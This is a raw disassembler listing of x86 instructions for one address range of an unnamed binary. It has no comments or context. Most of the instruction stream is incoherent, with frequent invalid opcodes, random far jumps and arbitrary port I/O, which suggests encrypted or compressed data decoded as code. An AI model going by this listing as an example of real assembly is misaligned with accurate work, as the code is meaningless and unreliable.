  41cea1:	outs   dx,BYTE PTR ds:[esi]
  41cea2:	or     DWORD PTR [edx+edx*8-0x56930d9f],0x23d32088
  41cead:	cmp    eax,0x3b20eb92
  41ceb2:	mov    eax,ds:0x9b1c307c
  41ceb7:	loop   0x41ce66
  41ceb9:	jmp    0x6e18:0xf76ca9bb
  41cec0:	pusha  
  41cec1:	dec    ebx
  41cec2:	sbb    al,0x85
  41cec4:	out    0x44,eax
  41cec6:	xor    eax,0x7459dd92
  41cecb:	out    0x97,eax
  41cecd:	xchg   esp,esp
  41cecf:	jge    0x41ce77
  41ced1:	push   ds
  41ced2:	lahf   
  41ced3:	jo     0x41cea3
  41ced5:	(bad)  
  41ced6:	sbb    edx,edx
  41ced8:	lock arpl WORD PTR [esi+0xca41b62],dx
  41cedf:	int3   
  41cee0:	and    ecx,ebx
  41cee2:	test   al,0xaf
  41cee4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cee5:	loope  0x41ceaa
  41cee7:	add    edx,DWORD PTR [ecx-0x5c770a0]
  41ceed:	fild   DWORD PTR [eax]
	...
  41cf53:	add    BYTE PTR [eax],al
  41cf55:	add    BYTE PTR [edi],al
  41cf57:	jp     0x41cf41
  41cf59:	jnp    0x41cf58
  41cf5b:	sti    
  41cf5c:	xchg   edi,eax
  41cf5d:	jle    0x41cfa6
  41cf5f:	jp     0x41cf3b
  41cf61:	lods   al,BYTE PTR ds:[esi]
  41cf62:	push   es
  41cf63:	xchg   dl,ah
  41cf65:	mov    ebx,0x13767
  41cf6a:	add    BYTE PTR [ecx],al
  41cf6c:	add    BYTE PTR [eax],al
  41cf6e:	jl     0x41cf28
  41cf70:	push   es
  41cf71:	repz add eax,0x3c918c3b
  41cf77:	push   edi
  41cf78:	cmp    DWORD PTR [edx+0x32],ebx
  41cf7b:	into   
  41cf7c:	test   al,0x24
  41cf7e:	fstp   DWORD PTR [esi-0x37f19f1b]
  41cf84:	jecxz  0x41cf0a
  41cf86:	or     al,0xcc
  41cf88:	test   BYTE PTR [edx],bl
  41cf8a:	adc    eax,0xa865f673
  41cf8f:	or     ecx,ebp
  41cf91:	imul   esi,esp,0xd33c80dc
  41cf97:	mov    bh,0x79
  41cf99:	mov    bl,0x48
  41cf9b:	inc    eax
  41cf9c:	sbb    eax,0x121fa25f
  41cfa1:	test   esp,edx
  41cfa3:	sub    ebx,edx
  41cfa5:	(bad)  
  41cfa6:	dec    esi
  41cfa7:	(bad)  
  41cfa8:	sbb    DWORD PTR [eax-0x5e],esi
  41cfab:	repz jne 0x41cf94
  41cfae:	xchg   edx,eax
  41cfaf:	leave  
  41cfb0:	cs jb  0x41cfd7
  41cfb3:	test   al,0x52
  41cfb5:	mov    cs,WORD PTR [ebp-0x516982ba]
  41cfbb:	repnz mov bh,0x2c
  41cfbe:	mov    cl,0x6d
  41cfc0:	call   FWORD PTR [edx]
  41cfc2:	cmp    BYTE PTR [ecx],ch
  41cfc4:	in     eax,dx
  41cfc5:	pop    ds
  41cfc6:	ja     0x41cf63
  41cfc8:	xor    BYTE PTR [ebp-0x75ee16ed],dh
  41cfce:	nop
  41cfcf:	test   BYTE PTR ds:0xc11f5ea,ch
  41cfd5:	jecxz  0x41d024
  41cfd7:	mov    edi,0x9462a916
  41cfdc:	cmp    ebx,DWORD PTR [ebx*1+0x12f9c717]
  41cfe3:	sub    BYTE PTR [eax],cl
  41cfe5:	sbb    ecx,0xf3b265a8
  41cfeb:	mov    cl,0x13
  41cfed:	and    ch,ah
  41cfef:	aas    
  41cff0:	nop
  41cff1:	push   eax
  41cff2:	repnz mov ecx,0xacd1bb6f
  41cff8:	xchg   ebx,eax
  41cff9:	test   al,0xf9
  41cffb:	mov    ebp,edi
  41cffd:	pop    DWORD PTR [edx]
  41cfff:	enter  0x1a77,0x15
  41d003:	out    0xd8,al
  41d005:	dec    esp
  41d006:	popa   
  41d007:	cmp    BYTE PTR [ebp-0x3ed3c1f2],0x71
  41d00e:	mov    ebx,DWORD PTR [edx-0x28221fc5]
  41d014:	and    DWORD PTR [edi],ebp
  41d016:	mov    bl,0x8f
  41d018:	aam    0x1f
  41d01a:	pop    esp
  41d01b:	pusha  
  41d01c:	xlat   BYTE PTR ds:[ebx]
  41d01d:	pop    ecx
  41d01e:	loop   0x41d069
  41d020:	imul   ebp,DWORD PTR [ecx+0x1a5d4b7b],0xffffffa6
  41d027:	loopne 0x41cfe6
  41d029:	inc    ebx
  41d02a:	xchg   ebx,eax
  41d02b:	dec    ecx
  41d02c:	(bad)  
  41d02d:	pushf  
  41d02e:	retf   
  41d02f:	and    al,0x64
  41d031:	fistp  DWORD PTR [edi+0x4c]
  41d034:	dec    eax
  41d035:	or     BYTE PTR [edx+0x1061a833],bl
  41d03b:	mov    cl,0x8c
  41d03d:	icebp  
  41d03e:	in     eax,dx
  41d03f:	xor    ah,bl
  41d041:	xor    ah,BYTE PTR [eax+0x452b58a7]
  41d047:	hlt    
  41d048:	mov    ah,cl
  41d04a:	jne    0x41d0ac
  41d04c:	inc    esi
  41d04d:	or     eax,0xc37e60ab
  41d052:	fabs   
  41d054:	push   0xf4e2b364
  41d059:	add    dl,BYTE PTR [ecx+0x2670a51c]
  41d05f:	test   DWORD PTR [edx+0x65],esp
  41d062:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d063:	or     DWORD PTR [edx],0xbf0070cf
  41d069:	sub    al,0x66
  41d06b:	ret    
  41d06c:	fwait
  41d06d:	lods   al,BYTE PTR ds:[esi]
	...
  41d0d6:	mov    ecx,0xad432034
  41d0db:	push   edi
  41d0dc:	sti    
  41d0dd:	dec    BYTE PTR [esi-0x1b]
  41d0e0:	mov    ebp,0x5f55d4bd
  41d0e5:	fsub   QWORD PTR [edi+0x38]
  41d0e8:	add    DWORD PTR [eax],eax
  41d0ea:	add    BYTE PTR [ecx],al
  41d0ec:	add    BYTE PTR [eax],al
  41d0ee:	xchg   ebx,eax
  41d0ef:	(bad)  
  41d0f1:	mov    ah,0x3e
  41d0f3:	lds    edi,FWORD PTR [edx-0x6e]
  41d0f6:	add    bl,BYTE PTR [edi-0x32]
  41d0f9:	xchg   DWORD PTR gs:[edx-0x29],esi
  41d0fd:	in     al,dx
  41d0fe:	pushf  
  41d0ff:	clc    
  41d100:	retf   0x5360
  41d103:	dec    eax
  41d104:	call   0x3d5fc32b
  41d109:	(bad)  
  41d10a:	ror    DWORD PTR [esi],1
  41d10c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d10d:	jns    0x41d0fc
  41d10f:	pop    edx
  41d110:	rcr    al,1
  41d112:	sub    al,0xf8
  41d114:	popf   
  41d115:	mov    bl,0x56
  41d117:	add    BYTE PTR [ebp-0x34],cl
  41d11a:	outs   dx,BYTE PTR ds:[esi]
  41d11b:	xor    DWORD PTR [ebx],ecx
  41d11d:	sti    
  41d11e:	push   edi
  41d11f:	xchg   ebx,eax
  41d120:	loopne 0x41d178
  41d122:	popa   
  41d123:	test   DWORD PTR [eax-0x3afde71a],esi
  41d129:	jns    0x41d19c
  41d12b:	in     eax,0x46
  41d12d:	icebp  
  41d12e:	fild   QWORD PTR [ebp-0x56862945]
  41d134:	stc    
  41d135:	mov    bl,0x3b
  41d137:	mov    eax,0x56f5d5ff
  41d13c:	jle    0x41d19e
  41d13e:	jl     0x41d194
  41d140:	rcl    DWORD PTR [esi+0x413be3ae],cl
  41d146:	nop
  41d147:	mul    DWORD PTR [ebx+0x6c]
  41d14a:	gs adc bl,cl
  41d14d:	jbe    0x41d0db
  41d14f:	sbb    al,BYTE PTR [edi+0x62]
  41d152:	dec    edi
  41d153:	enter  0x9b94,0xd3
  41d157:	inc    ecx
  41d158:	(bad)  
  41d159:	mov    esi,0xebea25d5
  41d15e:	sub    DWORD PTR [ecx+0x6],esp
  41d161:	fist   WORD PTR [edx+0x56285afc]
  41d167:	fucomi st,st(7)
  41d169:	xchg   DWORD PTR [esi+0x61],ebp
  41d16c:	mov    al,0xd3
  41d16e:	call   0x83514749
  41d173:	mov    eax,ds:0x6bac1285
  41d178:	mov    ah,bl
  41d17a:	push   esi
  41d17b:	dec    edx
  41d17c:	ror    BYTE PTR [ebp-0x2ce143db],1
  41d182:	cmp    DWORD PTR [ecx],edi
  41d184:	cmc    
  41d185:	or     DWORD PTR [ebx],0x111ed5db
  41d18b:	adc    DWORD PTR [ebx+0x1fc669f3],0xc
  41d192:	arpl   WORD PTR [ebp-0xf],cx
  41d195:	(bad)  
  41d196:	les    edi,FWORD PTR [esi]
  41d198:	inc    edi
  41d199:	in     eax,0x1e
  41d19b:	dec    esi
  41d19c:	out    0x1e,al
  41d19e:	adc    DWORD PTR [esi-0x78],eax
  41d1a1:	push   0x80caabe6
  41d1a6:	sahf   
  41d1a7:	jmp    0x41d168
  41d1a9:	adc    ch,bl
  41d1ab:	loop   0x41d1cb
  41d1ad:	fwait
  41d1ae:	(bad)  
  41d1af:	jo     0x41d200
  41d1b1:	mov    eax,eax
  41d1b3:	aas    
  41d1b4:	lods   al,BYTE PTR ds:[esi]
  41d1b5:	(bad)  
  41d1b6:	jmp    0x8879:0xc5f4fa2f
  41d1bd:	xor    al,0x3f
  41d1bf:	xchg   ecx,eax
  41d1c0:	jmp    0x41d17b
  41d1c2:	jmp    0xfdb05018
  41d1c7:	je     0x41d1cf
  41d1c9:	call   0x364c110a
  41d1ce:	icebp  
  41d1cf:	sub    al,0x5
  41d1d1:	sbb    al,0xa8
  41d1d3:	scas   eax,DWORD PTR es:[edi]
  41d1d4:	dec    ecx
  41d1d5:	mov    edx,0x2d7a3b16
  41d1da:	xlat   BYTE PTR ds:[ebx]
  41d1db:	xchg   ebp,eax
  41d1dc:	jae    0x41d184
  41d1de:	or     BYTE PTR [ecx],0x5c
  41d1e1:	and    esp,DWORD PTR [esi]
  41d1e3:	xor    BYTE PTR [ecx+0x76],0x1a
  41d1e7:	es push 0xffffffb6
  41d1ea:	lock mov esp,0x32d1
	...
  41d254:	add    BYTE PTR [eax],al
  41d256:	push   eax
  41d257:	ret    
  41d258:	cmp    ecx,DWORD PTR ds:0xdf76fdbb
  41d25e:	xor    DWORD PTR [ebp-0x7],esp
  41d261:	hlt    
  41d262:	inc    ecx
  41d263:	std    
  41d264:	fcom   DWORD PTR [ebx+0x67]
  41d267:	cmp    DWORD PTR [ecx],eax
  41d269:	add    BYTE PTR [eax],al
  41d26b:	add    DWORD PTR [eax],eax
  41d26d:	add    BYTE PTR [edx],bh
  41d26f:	pop    eax
  41d270:	lahf   
  41d271:	cs xchg ebx,eax
  41d273:	cld    
  41d274:	cmp    al,0x2d
  41d276:	sub    eax,esp
  41d278:	das    
  41d279:	xchg   edx,eax
  41d27a:	cdq    
  41d27b:	or     DWORD PTR [eax+ecx*1+0xfbbc8ca],0xffffff9c
  41d283:	sub    al,BYTE PTR [ebp+0x10]
  41d286:	lahf   
  41d287:	cmp    al,0x5f
  41d289:	mov    WORD PTR [esi+ecx*4-0x2e],?
  41d28d:	shr    ecx,cl
  41d28f:	pop    ss
  41d290:	jl     0x41d29a
  41d292:	adc    al,0x96
  41d294:	adc    DWORD PTR ds:0x540375e2,esi
  41d29a:	sbb    BYTE PTR [esi-0x601f4c3d],al
  41d2a0:	shr    DWORD PTR [eax],1
  41d2a2:	mov    DWORD PTR [esi],edx
  41d2a4:	push   esp
  41d2a5:	imul   ebp,DWORD PTR [ecx-0x3127d689],0x0
  41d2ac:	imul   esi,DWORD PTR [ebx-0x236496a6],0xffffffd8
  41d2b3:	inc    esp
  41d2b4:	test   eax,edi
  41d2b6:	push   0x4c30e443
  41d2bb:	jno    0x41d30d
  41d2bd:	(bad)
  41d2c0:	push   ebp
  41d2c1:	sti    
  41d2c2:	push   ds
  41d2c3:	add    al,0xc8
  41d2c5:	dec    edi
  41d2c6:	sbb    DWORD PTR [edx],edx
  41d2c8:	sub    al,0xde
  41d2ca:	cmp    ch,BYTE PTR [eax]
  41d2cc:	enter  0x242b,0x6
  41d2d0:	cwde   
  41d2d1:	mov    ebx,0xd825fc6c
  41d2d6:	imul   eax,esi,0xe256d809
  41d2dc:	adc    al,0xb7
  41d2de:	sti    
  41d2df:	imul   ebx,DWORD PTR [edx-0x73],0xc0bdb41
  41d2e6:	sub    BYTE PTR [esi-0x6b],0x56
  41d2ea:	shl    BYTE PTR [esi+esi*1-0x78c9abd3],0x25
  41d2f2:	ficom  WORD PTR [eax]
  41d2f4:	add    DWORD PTR [ecx+0x78],ebp
  41d2f7:	out    dx,eax
  41d2f8:	out    0x11,al
  41d2fa:	imul   ecx,DWORD PTR [ebx+0x362b00b6],0x57b00876
  41d304:	test   BYTE PTR [esi+ecx*2+0x28537c49],0x72
  41d30c:	cs inc esi
  41d30e:	daa    
  41d30f:	mov    cl,0x74
  41d311:	xchg   ebx,esp
  41d313:	cld    
  41d314:	sub    al,dl
  41d316:	fcomp  QWORD PTR [ebx+0x29]
  41d319:	xor    BYTE PTR [esi],bl
  41d31b:	std    
  41d31c:	and    eax,0x1bdbf464
  41d321:	jge    0x41d362
  41d323:	fidiv  DWORD PTR gs:[eax]
  41d326:	loope  0x41d389
  41d328:	aaa    
  41d329:	adc    al,0x2d
  41d32b:	dec    ecx
  41d32c:	jmp    0x41d2b9
  41d32e:	xchg   ebx,eax
  41d32f:	push   ebx
  41d330:	retf   0x6fe5
  41d333:	dec    edx
  41d334:	stc    
  41d335:	sahf   
  41d336:	push   esi
  41d337:	push   esp
  41d338:	mov    bl,0x17
  41d33a:	add    cl,BYTE PTR [edi*4-0x271d6c95]
  41d341:	out    dx,al
  41d342:	mov    ecx,0xdb3df474
  41d347:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  41d349:	stos   BYTE PTR es:[edi],al
  41d34a:	and    bl,0xe8
  41d34d:	sub    bl,BYTE PTR [edi-0x7b9b5cd7]
  41d353:	push   0xfffffffb
  41d355:	and    cl,BYTE PTR [ecx+ebx*2+0x2c]
  41d359:	pop    ebp
  41d35a:	popa   
  41d35b:	popa   
  41d35c:	push   eax
  41d35d:	ins    DWORD PTR es:[edi],dx
  41d35e:	dec    eax
  41d35f:	fldenv [edi]
  41d361:	hlt    
  41d362:	iret   
  41d363:	mov    al,ds:0x8f5ccdee
  41d368:	mov    ecx,0x5a43933e
  41d36d:	xchg   esp,eax
	...
  41d3d6:	inc    BYTE PTR [eax+0x7dff54f9]
  41d3dc:	jmp    FWORD PTR [edx+0x69c02f8d]
  41d3e2:	nop
  41d3e3:	inc    edx
  41d3e4:	mov    esi,0x13a676b
  41d3e9:	add    BYTE PTR [eax],al
  41d3eb:	add    DWORD PTR [eax],eax
  41d3ed:	add    BYTE PTR ds:0xf55c713,bl
  41d3f3:	(bad)  
  41d3f4:	js     0x41d3f1
  41d3f6:	dec    esp
  41d3f7:	in     al,dx
  41d3f8:	dec    ecx
  41d3f9:	nop
  41d3fa:	xchg   ebx,eax
  41d3fb:	inc    esi
  41d3fc:	js     0x41d45c
  41d3fe:	int3   
  41d3ff:	nop
  41d400:	push   ds
  41d401:	mov    ebp,0x1cfb05b0
  41d406:	cwde   
  41d407:	pop    edx
  41d408:	inc    ebp
  41d409:	jo     0x41d3f9
  41d40b:	mov    eax,ds:0xbb5a954f
  41d410:	jo     0x41d443
  41d412:	adc    DWORD PTR [ebx-0x80],esp
  41d415:	sub    dh,al
  41d417:	neg    BYTE PTR ds:0x1c45fb2a
  41d41d:	ss ret 
  41d41f:	mov    ds:0x50c093f0,eax
  41d424:	sti    
  41d425:	jno    0x41d3ff
  41d427:	stos   DWORD PTR es:[edi],eax
  41d428:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d429:	(bad)  [esi+edx*2-0x37]
  41d42d:	div    BYTE PTR [eax+0x21]
  41d430:	popf   
  41d431:	or     al,0x86
  41d433:	inc    edi
  41d434:	xor    ebx,DWORD PTR ds:0x26daf3d1
  41d43a:	sbb    BYTE PTR [ebx+0x2a],ah
  41d43d:	jp     0x41d4ae
  41d43f:	mov    ah,0x5a
  41d441:	mov    ds:0xb409e7e8,al
  41d446:	pop    es
  41d447:	out    dx,al
  41d448:	imul   ecx,DWORD PTR [edx],0x9c0c8cce
  41d44e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d44f:	sub    edi,0x98ff5739
  41d455:	mov    al,0x67
  41d457:	shl    DWORD PTR [edi-0x2485fb21],1
  41d45d:	and    BYTE PTR [ebp+ecx*2-0x78],bl
  41d461:	scas   al,BYTE PTR es:[edi]
  41d462:	not    BYTE PTR [ebx]
  41d464:	push   ebx
  41d465:	jo     0x41d4d4
  41d467:	out    0x5d,eax
  41d469:	imul   ebx,DWORD PTR [edi+esi*1-0x4],0x2c
  41d46e:	cmp    al,0xdb
  41d470:	mov    eax,ds:0x2c73499a
  41d475:	sbb    cl,al
  41d477:	or     dh,BYTE PTR [ebp+0x3f]
  41d47a:	je     0x41d4a5
  41d47c:	and    ah,ch
  41d47e:	out    dx,al
  41d47f:	dec    ecx
  41d480:	pop    ss
  41d481:	lock (bad) 
  41d483:	fidivr WORD PTR [ebp-0x74]
  41d486:	add    edx,DWORD PTR [eax+0x6bf5bbfe]
  41d48c:	mov    bl,BYTE PTR [edi-0x37c86dca]
  41d492:	push   eax
  41d493:	jae    0x41d4e4
  41d495:	pop    ebx
  41d496:	fst    st(0)
  41d498:	je     0x41d420
  41d49a:	mov    ch,0x3e
  41d49c:	pop    ecx
  41d49d:	xor    BYTE PTR [edx-0x18],ch
  41d4a0:	rol    BYTE PTR ds:0xedc53bdf,1
  41d4a6:	and    BYTE PTR [ebx-0x4c3c7f13],al
  41d4ac:	jae    0x41d449
  41d4ae:	push   0x726e1450
  41d4b3:	push   ebp
  41d4b4:	rcr    BYTE PTR [ebp+0x4f62be23],1
  41d4ba:	jmp    0xc42e:0x6cda70a4
  41d4c1:	mov    ebx,0x645ea9e2
  41d4c6:	push   esp
  41d4c7:	cs dec esp
  41d4c9:	fadd   QWORD PTR [edx]
  41d4cb:	jb     0x41d462
  41d4cd:	fimul  WORD PTR [edx-0x2f429e7c]
  41d4d3:	ret    0x61e8
  41d4d6:	ds pop esi
  41d4d8:	sar    dl,cl
  41d4da:	inc    eax
  41d4db:	in     al,0x45
  41d4dd:	sub    ebx,ecx
  41d4df:	mov    eax,0x39cfc4fe
  41d4e4:	push   esi
  41d4e5:	out    dx,al
  41d4e6:	and    ecx,ebx
  41d4e8:	fisubr WORD PTR gs:[esi]
  41d4eb:	cs aam 0x48
	...
  41d556:	div    BYTE PTR [esi]
  41d558:	rcl    BYTE PTR [edx+edx*8+0x7d76f6f4],cl
  41d55f:	nop
  41d560:	call   0x67f4:0xf2b1e189
  41d567:	cmp    eax,DWORD PTR [ecx]
  41d569:	add    BYTE PTR [eax],al
  41d56b:	add    DWORD PTR [eax],eax
  41d56d:	add    BYTE PTR [edi],bh
  41d56f:	mov    esi,DWORD PTR [ebp+0x60]
  41d572:	lds    edx,FWORD PTR ss:[edi]
  41d575:	mov    esi,0x6359f6a5
  41d57a:	sbb    BYTE PTR [edi+ecx*1+0x38],cl
  41d57e:	inc    ecx
  41d57f:	loop   0x41d5be
  41d581:	jb     0x41d516
  41d583:	data16 aaa 
  41d585:	daa    
  41d586:	sbb    dh,al
  41d588:	or     ebp,0xb936a65b
  41d58e:	cmp    al,0xc1
  41d590:	dec    edx
  41d591:	jns    0x41d58d
  41d593:	or     dl,BYTE PTR [eax+esi*8]
  41d596:	and    al,0xdb
  41d598:	push   ds
  41d599:	(bad)  
  41d59a:	fsubr  st,st(3)
  41d59c:	ror    DWORD PTR [ecx+0x2d],cl
  41d59f:	jo     0x41d552
  41d5a1:	(bad)
  41d5a4:	mov    esp,0x3dafeefd
  41d5a9:	push   esp
  41d5aa:	mov    bl,0xc4
  41d5ac:	loop   0x41d59c
  41d5ae:	xor    DWORD PTR [eax],ecx
  41d5b0:	sub    edi,ecx
  41d5b2:	int3   
  41d5b3:	outs   dx,BYTE PTR ds:[esi]
  41d5b4:	bound  edx,QWORD PTR [ebp+ecx*4+0x18dc1d47]
  41d5bb:	das    
  41d5bc:	jl     0x41d5e1
  41d5be:	or     BYTE PTR [ebp-0xd],0xff
  41d5c2:	pushf  
  41d5c3:	lds    esi,FWORD PTR [ecx+ebp*2-0x43772b7f]
  41d5ca:	cmp    al,0xf7
  41d5cc:	mov    esi,0x507c6ce1
  41d5d1:	xchg   esp,eax
  41d5d2:	sub    ah,BYTE PTR [edx+0x44e6b9fb]
  41d5d8:	xchg   edi,eax
  41d5d9:	jne    0x41d603
  41d5db:	sbb    al,0x2f
  41d5dd:	lods   eax,DWORD PTR ds:[esi]
  41d5de:	ds into 
  41d5e0:	cmp    al,0x2f
  41d5e2:	mov    bh,0x41
  41d5e4:	inc    esi
  41d5e5:	add    dh,BYTE PTR [ebx*4-0x36b0680d]
  41d5ec:	out    0xd4,eax
  41d5ee:	lea    ebp,[ecx-0x40]
  41d5f1:	aad    0xed
  41d5f3:	push   0x76
  41d5f5:	mov    DWORD PTR [ebx+0x3c],0xe75649b0
  41d5fc:	mov    ecx,edi
  41d5fe:	mov    ah,0x57
  41d600:	ret    
  41d601:	test   al,0xad
  41d603:	or     ebp,DWORD PTR [ecx-0xe]
  41d606:	loopne 0x41d60e
  41d608:	in     al,dx
  41d609:	sub    al,0x11
  41d60b:	pop    ebp
  41d60c:	add    al,0x72
  41d60e:	xor    DWORD PTR [edi],ebp
  41d610:	xor    DWORD PTR [esp+edx*1],ecx
  41d613:	dec    esi
  41d614:	mov    ah,0x5e
  41d616:	pop    ss
  41d617:	out    dx,al
  41d618:	sub    bh,BYTE PTR [ebp-0x32]
  41d61b:	mov    ebp,0xb790eb9f
  41d620:	cli    
  41d621:	sbb    ecx,DWORD PTR [esi-0x7ce65041]
  41d627:	js     0x41d62d
  41d629:	add    esp,DWORD PTR [ebp+0x69c0623f]
  41d62f:	xor    al,0xc1
  41d631:	(bad)  
  41d632:	and    eax,0x17f85680
  41d637:	shl    BYTE PTR [esp+esi*4+0x35],1
  41d63b:	xor    DWORD PTR [ecx-0xd429da3],0x61
  41d642:	addr16 sub edi,edx
  41d645:	dec    esi
  41d646:	pop    es
  41d647:	sahf   
  41d648:	xor    bh,BYTE PTR [ebx]
  41d64a:	outs   dx,BYTE PTR ds:[esi]
  41d64b:	sbb    DWORD PTR [ecx],0xffffffaf
  41d64e:	dec    esi
  41d64f:	push   0xffffffbd
  41d651:	xor    eax,0x65f30d3d
  41d656:	xchg   edi,eax
  41d657:	ja     0x41d65d
  41d659:	cmc    
  41d65a:	mov    eax,ds:0xc6c70dc8
  41d65f:	xchg   BYTE PTR ds:0xd3d762a2,cl
  41d665:	xchg   ecx,eax
  41d666:	or     eax,0x2cf71a5a
  41d66b:	loope  0x41d602
  41d66d:	xor    DWORD PTR [eax],eax
	...
  41d6d3:	add    BYTE PTR [eax],al
  41d6d5:	add    BYTE PTR [ecx+ebx*4+0x4c],bh
  41d6d9:	jbe    0x41d6c8
  41d6db:	idiv   DWORD PTR [esi-0x65]
  41d6de:	or     eax,0x9366e435
  41d6e3:	sti    
  41d6e4:	adc    esp,DWORD PTR cs:[edi+0x3c]
  41d6e8:	add    DWORD PTR [eax],eax
  41d6ea:	add    BYTE PTR [ecx],al
  41d6ec:	add    BYTE PTR [eax],al
  41d6ee:	scas   al,BYTE PTR es:[edi]
  41d6ef:	sub    cl,cl
  41d6f1:	data16 ds xor cl,bl
  41d6f5:	mov    ebp,0x3f1340aa
  41d6fa:	mov    dh,0x63
  41d6fc:	push   cs
  41d6fd:	adc    edx,edx
  41d6ff:	stc    
  41d700:	std    
  41d701:	jp     0x41d6e5
  41d703:	or     al,0xa7
  41d705:	js     0x41d6f3
  41d707:	nop
  41d708:	mov    WORD PTR [esi-0x44],es
  41d70b:	xchg   ebx,eax
  41d70c:	jg     0x41d733
  41d70e:	icebp  
  41d70f:	mov    ah,0xca
  41d711:	xor    esi,ebx
  41d713:	push   edx
  41d714:	ficom  DWORD PTR [eax-0x3fb7b002]
  41d71a:	jp     0x41d6ec
  41d71c:	dec    esp
  41d71d:	dec    ebx
  41d71e:	mov    bl,0x19
  41d720:	bound  ebp,QWORD PTR [eax+0x54]
  41d723:	in     eax,0xb6
  41d725:	mov    esp,0xbebad459
  41d72a:	nop
  41d72b:	sub    BYTE PTR [esi+ebx*2],al
  41d72e:	fisubr WORD PTR ds:0x2a0b0553
  41d734:	std    
  41d735:	jb     0x41d75b
  41d737:	ins    BYTE PTR es:[edi],dx
  41d738:	xor    eax,0x6ebe52cb
  41d73d:	rcl    BYTE PTR [esi-0x2f],0x24
  41d741:	call   0x9d21:0x9df409e5
  41d748:	ins    DWORD PTR es:[edi],dx
  41d749:	mov    al,ds:0xc84fa6bd
  41d74e:	push   0xd226cbe9
  41d753:	fwait
  41d754:	out    dx,eax
  41d755:	fs enter 0x11e3,0x18
  41d75a:	push   ebp
  41d75b:	(bad)  
  41d75c:	scas   al,BYTE PTR es:[edi]
  41d75d:	leave  
  41d75e:	in     al,dx
  41d75f:	into   
  41d760:	push   0xffffffd3
  41d762:	int    0x62
  41d764:	outs   dx,BYTE PTR ds:[esi]
  41d765:	xor    BYTE PTR [eax+0x21],0x10
  41d769:	sti    
  41d76a:	jg     0x41d7d5
  41d76c:	ja     0x41d794
  41d76e:	retf   0x977a
  41d771:	pop    edi
  41d772:	(bad)  
  41d773:	and    ah,BYTE PTR ds:0x67ff6fdf
  41d779:	mov    ch,al
  41d77b:	hlt    
  41d77c:	adc    esp,esp
  41d77e:	mov    ch,0x28
  41d780:	dec    ecx
  41d781:	or     al,0xaf
  41d783:	data16 jns 0x41d707
  41d786:	sub    eax,0xe8497424
  41d78b:	xor    edx,DWORD PTR [ebx-0x28ffe463]
  41d791:	test   al,0xa8
  41d793:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d794:	mov    bh,0x7a
  41d796:	add    al,0x72
  41d798:	jo     0x41d74a
  41d79a:	out    0xb7,eax
  41d79c:	loope  0x41d7ce
  41d79e:	mov    ecx,0x9ce119da
  41d7a3:	(bad)  
  41d7a4:	mov    bh,0xaf
  41d7a6:	push   eax
  41d7a7:	stc    
  41d7a8:	mov    edi,0x71383c73
  41d7ad:	jo     0x41d7ca
  41d7af:	inc    esp
  41d7b0:	push   cs
  41d7b1:	dec    DWORD PTR [ecx-0x1d]
  41d7b4:	(bad)  
  41d7b5:	fild   DWORD PTR [ebx-0x61d506]
  41d7bb:	imul   ebx,DWORD PTR [edi-0x4a],0xff719ec5
  41d7c2:	and    bh,BYTE PTR [esi+ebx*1+0x50e1d6bd]
  41d7c9:	ja     0x41d802
  41d7cb:	(bad)  
  41d7cc:	out    dx,al
  41d7cd:	jp     0x41d7a7
  41d7cf:	jg     0x41d75e
  41d7d1:	pop    edx
  41d7d2:	mov    esp,0xdee6614a
  41d7d7:	xchg   ebx,eax
  41d7d8:	mov    ah,0x18
  41d7da:	push   es
  41d7db:	rcr    DWORD PTR [edi],0xc7
  41d7de:	inc    ebp
  41d7df:	xor    BYTE PTR [edx],bh
  41d7e1:	shr    al,0x5c
  41d7e4:	mov    ecx,0x3df8fb5
  41d7e9:	sub    al,0xa4
  41d7eb:	mov    ds:0x6244,eax
	...
  41d854:	add    BYTE PTR [eax],al
  41d856:	and    al,0xce
  41d858:	outs   dx,BYTE PTR ds:[esi]
  41d859:	sub    ch,dh
  41d85b:	stos   BYTE PTR es:[edi],al
  41d85c:	fs into 
  41d85e:	jmp    0x41d7eb
  41d860:	leave  
  41d861:	aas    
  41d862:	scas   al,BYTE PTR es:[edi]
  41d863:	fidiv  WORD PTR [edi+0x3b]
  41d866:	addr16 cmp eax,0x1000001
  41d86c:	add    BYTE PTR [eax],al
  41d86e:	fistp  WORD PTR [edi-0x5c]
  41d871:	aaa    
  41d872:	aaa    
  41d873:	sub    edi,DWORD PTR [edi+eiz*8-0x4f]
  41d877:	push   ebp
  41d878:	push   es
  41d879:	out    0x2f,eax
  41d87b:	and    DWORD PTR [ebp-0x4aae05d7],0x45b82187
  41d885:	adc    bh,BYTE PTR [edx+edi*8+0x2ab23bd0]
  41d88c:	sbb    eax,0x6320d66a
  41d891:	sub    al,BYTE PTR [edi-0x3d]
  41d894:	push   0x434a50bd
  41d899:	add    dl,BYTE PTR [edx+ebp*1-0x6b5c37d6]
  41d8a0:	sub    eax,0xaa841b35
  41d8a5:	or     cl,BYTE PTR [esi]
  41d8a7:	push   es
  41d8a8:	lahf   
  41d8a9:	scas   al,BYTE PTR es:[edi]
  41d8aa:	adc    al,0xb6
  41d8ac:	popf   
  41d8ad:	inc    edi
  41d8ae:	aaa    
  41d8af:	outs   dx,BYTE PTR ds:[esi]
  41d8b0:	dec    edx
  41d8b1:	imul   eax,DWORD PTR [ebx],0x70
  41d8b4:	pop    ebx
  41d8b5:	mov    dl,0x61
  41d8b7:	mov    edi,0x93c3bdc2
  41d8bc:	mov    ebp,0xa4916583
  41d8c1:	mov    ecx,0xb280eef7
  41d8c6:	xor    dh,dl
  41d8c8:	jbe    0x41d8ce
  41d8ca:	ss jl  0x41d923
  41d8cd:	xor    al,0x50
  41d8cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d8d0:	mov    DWORD PTR [ecx-0x9],esi
  41d8d3:	pop    ebx
  41d8d4:	dec    edi
  41d8d5:	sbb    eax,0x6d4ce368
  41d8da:	je     0x41d8fc
  41d8dc:	inc    ecx
  41d8dd:	dec    ebp
  41d8de:	xor    eax,0x80e5a8d8
  41d8e3:	jnp    0x41d8f5
  41d8e5:	jmp    0x41d87f
  41d8e7:	mov    ah,BYTE PTR [esi+ebp*4]
  41d8ea:	sbb    DWORD PTR [eax-0x1b0fcba8],eax
